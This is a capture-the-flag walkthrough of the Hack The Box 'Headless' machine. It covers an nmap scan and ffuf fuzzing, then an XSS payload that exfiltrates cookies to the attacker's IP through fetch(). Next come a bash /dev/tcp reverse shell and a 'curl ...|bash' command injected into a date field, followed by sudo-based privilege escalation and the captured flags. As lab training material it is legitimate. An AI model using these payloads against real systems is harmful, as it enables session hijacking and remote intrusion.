---
title: Headless
date modified: Tuesday, May 14th 2024, 8:02:31 pm
---

## Enumeration

```Bash
nmap 10.10.11.8 -sC -sV -oN nmap-scan-headless.txt # Scan the default ports, look for version/service info and write it to a file.

nmap --help | grep -e "\-sC" -e "\-sV" -e "\-oN"  # This can be used to look up what commands do.
...SNIP...
  -sV: Probe open ports to determine service/version info
  -sC: equivalent to --script=default
  -oN/-oX/-oS/-oG <file>: Output scan in normal, XML, s|<rIpt kIddi3,
```

From our nmap scan we can see that the following ports are open:
- Port 22 - SSH
- Port 5000 - upnp?
	- This appears to be some kind of website, since it accepts an HTTP GET request.

Navigating to http://10.10.11.8:5000/ in our web browser gives us the following webpage:
![[Pasted image 20240513223819.png]]

We can then try to ask questions, which leads us to a form - maybe we can inject some malicious code? Makes sense to open this up in BURP or ZAP and look around for any vulnerabilities.

We can see an interesting cookie response, when we navigate to the root of the website:

```HTML
is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs; Path=/ 
```

There could maybe be an admin panel, then we can use this cookie to bypass the login? Lets start to fuzz the website:

```Bash
ffuf -w /usr/share/wfuzz/wordlist/general/big.txt -u http://10.10.11.8:5000/FUZZ -recursion -recursion-depth 1 -v

[Status: 200, Size: 2363, Words: 836, Lines: 93, Duration: 26ms]
| URL | http://10.10.11.8:5000/support
    * FUZZ: support

[Status: 500, Size: 265, Words: 33, Lines: 6, Duration: 31ms]
| URL | http://10.10.11.8:5000/dashboard
    * FUZZ: dashboard

```

**When I'm Fuzzing use a BIG wordlist, to ensure you don't miss anything.**

Fuzzing doesn't return anything we don't already know. Looking back at the Nmap scan, we see that the HTTP server that is running the website is Werkzeug/2.2.2, is this vulnerable to anything?

The path forward is XSS and using the admin cookie to try access the dashboard area and get authenticated.

## Exploitation

Knowing that the website is vulnerable to XSS, we can try test for it:

``` HTML
<img src=x onerror=fetch('http://10.10.14.227/?c='+document.cookie);>
```

This is our payload and if we test it on the support forum:
![[Pasted image 20240514121230.png]]

This tells us that the website is vulnerable to XSS - as the cookie has been added to our request. We need to tailor this payload so that we can get the admin cookie.

Within Burp repeater we can modify the request, so that the cookie is sent to a HTTP server running on our machine:

```HTML
User-Agent: <img src=x onerror=fetch('http://10.10.14.227/?c='+document.cookie);>
...SNIP...
fname=a&lname=a&email=a%40a.com&phone=a&message=a;<img src=x onerror=fetch('http://10.10.14.227/?c='+document.cookie);>
```

After some waiting:
![[Pasted image 20240514124040.png]]

We have our admin cookie:
```Bash
is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0
```

Now we can modify the cookie on the dashboard area to the admin cookie, so that we gain access to the dashboard. We can open browser tools, then change the cookie value to our admin value.

Now we have access to the dashboard:
![[Pasted image 20240514124258.png]]
## Foothold:

Even though we have access to this admin panel, the page doesn't do much. Better bring it into BURP and have a look at it.

We can't just open a netcat listener and get a reverse shell right away. We need to wrap it up within a curl command - this is likely because we can get user access through this date field, but not root.

We can use [Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) to find reverse shells, in this case we want **Bash TCP/UDP**

```Bash
nc -lvnp 1234 # Start a letcat listener on our local machine.
bash -c 'bash -i >& /dev/tcp/10.10.14.227/1234 0>&1' # Our reverse shell command
python3 -m http.server # Start a HTTP server on our local machine to host the reverse shell
curl http://10.10.14.227/shell.sh|bash # insert this into the date field in the burp request
```

If we then send this request in burp:
![[Pasted image 20240514145229.png]]

and look back at our netcat listener:
![[Pasted image 20240514145525.png]]

We have user access.

## Privilege Escalation

Now our job is to find the user flag and to gain root.

**Finding the user flag:**
```Bash
dvir@headless:~$ ls
ls
app
geckodriver.log
user.txt

dvir@headless:~$ cat user.txt
70467ca2d62544d6ab2940f1e802938c
```

**Finding root flag:**
```Bash
sudo -l
...SNIP...
Matching Defaults entries for dvir on headless:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User dvir may run the following commands on headless:
    (ALL) NOPASSWD: /usr/bin/syscheck

```

This tells us that we can run root commands within this *syscheck* binary. Within syscheck we have the initdb.sh, which we can change the file permissions of to gain root.
![[Pasted image 20240514152842.png]]
Then we need to spawn another bash shell:
![[Pasted image 20240514152855.png]]

Navigate to root, and you have to the root flag:
![[Pasted image 20240514152947.png]]

```
f999ca507da53e30f1adb34a090290a8
```
***

## Lessons Learned

1. When fuzzing pick large wordlists and leave them running in the background, you don't want to miss anything.
	1. directory-list-2.3.medium.txt
	2. small.txt                         
2. Whenever you have a forum, test it using an XSS payload to see if anything happens.
3. Be patient and careful when trying to upgrade from a web shell to a reverse shell.
4. Its OK to give it some time and come back later.
5. Resetting the machine generally won't fix your problems. But it never hurts to try it once or twice.

